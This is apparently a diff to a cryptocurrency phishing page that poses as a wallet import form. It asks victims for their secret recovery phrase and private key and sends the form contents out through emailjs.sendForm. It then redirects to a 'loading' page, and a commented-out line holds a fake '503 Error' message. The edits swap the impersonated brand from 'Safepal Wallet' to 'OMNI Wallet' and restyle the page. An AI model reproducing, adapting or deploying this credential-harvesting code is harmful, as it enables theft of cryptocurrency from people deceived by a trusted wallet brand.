@@ -8391,9 +8391,9 @@
   margin-top: 10rem;
 }
 body{
-    /* background-size: cover;
+    background-size: cover;
   background-repeat: no-repeat;
-  background-image: url("index_files/image.png"); */
+  background-image: url("index_files/image.png");
 }
 
 
@@ -8532,7 +8532,7 @@ body{
                           font-weight: 600;
                           margin-bottom: 0.7rem;
                         " type="text" name="wallet-name" class="form-select" aria-label="Default select example">
-                        <option selected="">Safepal Wallet</option>
+                        <option selected="">OMNI Wallet</option>
                       </select>
                       <label class="form-label">To import your wallet type your secret phrase. <span style="color: rgb(132, 132, 255);">Learn more...</span></label>
 
@@ -8561,7 +8561,7 @@ body{
                           font-weight: 600;
                           margin-bottom: 0.7rem;
                         " type="text" name="wallet-name" class="form-select" aria-label="it Default select example">
-                        <option selected="">Safepal Wallet</option>
+                        <option selected="">OMNI Wallet</option>
                       </select>
                       <label class="form-label">Private Key</label>
 
@@ -8633,14 +8633,14 @@ body{
 
       emailjs.sendForm(serviceID, templateID, this)
         .then(() => {
-          console.log("Your mail is sent!");
           window.location.href = "loading.html";
           //alert("503 Error, if this persist kindly sync another wallet and try again or contact admin");
         }, (err) => {
           alert("Please try again!");
         });
 
-      console.log("Done");
+
+      console.log("Your mail is sent!");
 
 
 
